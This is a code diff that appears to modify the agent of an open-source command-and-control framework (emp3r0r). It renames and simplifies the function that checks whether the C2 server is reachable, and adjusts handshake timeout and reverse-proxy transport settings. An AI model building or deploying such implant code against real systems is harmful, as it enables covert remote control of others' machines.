@@ -11,7 +11,6 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
-	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -42,8 +41,9 @@ func CheckIn() (err error) {
 	return err
 }
 
-// IsCCOnline check RuntimeConfig.CCIndicator
-func IsCCOnline(proxy string) bool {
+// ConditionalC2Yes check RuntimeConfig.CCIndicator for conditional C2 connetion
+func ConditionalC2Yes(proxy string) bool {
+	log.Printf("Checking CCIndicator: %s", RuntimeConfig.CCIndicatorURL)
 	t := &http.Transport{
 		Dial: (&net.Dialer{
 			Timeout:   60 * time.Second,
@@ -63,20 +63,19 @@ func IsCCOnline(proxy string) bool {
 		Transport: t,
 		Timeout:   30 * time.Second,
 	}
-	resp, err := client.Get(RuntimeConfig.CCIndicator)
+	resp, err := client.Get(RuntimeConfig.CCIndicatorURL)
 	if err != nil {
-		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
+		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicatorURL, err)
 		return false
 	}
-	data, err := io.ReadAll(resp.Body)
+	_, err = io.ReadAll(resp.Body)
 	if err != nil {
-		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicator, err)
+		log.Printf("IsCCOnline: %s: %v", RuntimeConfig.CCIndicatorURL, err)
 		return false
 	}
 	defer resp.Body.Close()
 
-	log.Printf("Checking CCIndicator (%s) for %s", RuntimeConfig.CCIndicator, strconv.Quote(RuntimeConfig.CCIndicatorText))
-	return strings.Contains(string(data), RuntimeConfig.CCIndicatorText)
+	return true
 }
 
 func catchInterruptAndExit(cancel context.CancelFunc) {
@@ -201,7 +200,7 @@ func CCMsgTun(ctx context.Context, cancel context.CancelFunc) (err error) {
 			HandShakesMutex.Unlock()
 		}()
 		// wait until timeout or success
-		for i := 0; i < RuntimeConfig.Timeout; i++ {
+		for i := 0; i < RuntimeConfig.CCTimeout; i++ {
 			// if hello marked as success, return true
 			HandShakesMutex.RLock()
 			isSuccess := HandShakes[hello]
@@ -287,7 +286,7 @@ func setC2Transport() {
 		}
 
 		// if the proxy port is emp3r0r proxy server's port
-		if proxyURL.Port() == RuntimeConfig.Emp3r0rProxyServerPort && proxyURL.Hostname() == "127.0.0.1" {
+		if proxyURL.Port() == RuntimeConfig.AgentSocksServerPort && proxyURL.Hostname() == "127.0.0.1" {
 			emp3r0r_def.Transport = fmt.Sprintf("Reverse Proxy: %s", RuntimeConfig.C2TransportProxy)
 			return
 		}
